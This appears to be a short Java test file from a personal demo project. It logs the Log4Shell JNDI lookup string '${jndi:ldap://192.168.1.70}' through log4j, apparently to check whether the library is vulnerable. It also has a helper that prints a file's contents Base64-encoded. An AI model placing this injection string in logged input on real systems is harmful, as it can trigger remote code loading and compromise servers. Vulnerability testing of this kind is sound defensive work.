package com.ljq.mydemo.thread.test;

import cn.hutool.core.codec.Base64;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;


/**
 * @author gino
 * 2021-11-29
 */
public class test {
    private static final Logger logger= LogManager.getLogger(test.class);


    public static void main(String[] args) {
        Object object=new Object();
        object.notify();
        logger.error("${jndi:ldap://192.168.1.70}");
    }


    public static void bj_design_rule_xml(String filePath) {
        try {
            File jsonFile = new File(filePath);

            if (!jsonFile.exists()) {
                logger.info("file not exists...");
                return;
            }
            // BufferedReader br = new BufferedReader(new InputStreamReader(new
// FileInputStream(jsonFile), "UTF-8"));
            BufferedReader br = new BufferedReader(new FileReader(jsonFile));
            String line;
            StringBuffer sb = new StringBuffer();
            while ((line = br.readLine()) != null) {
                sb.append(line);
            }
            br.close();
            logger.info("Read file data ：" + jsonFile);

            String stred = Base64.encode(sb.toString().getBytes("utf-8"));
            System.out.println(stred);

            // System.out.println(Base64.decodeStr(stred));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
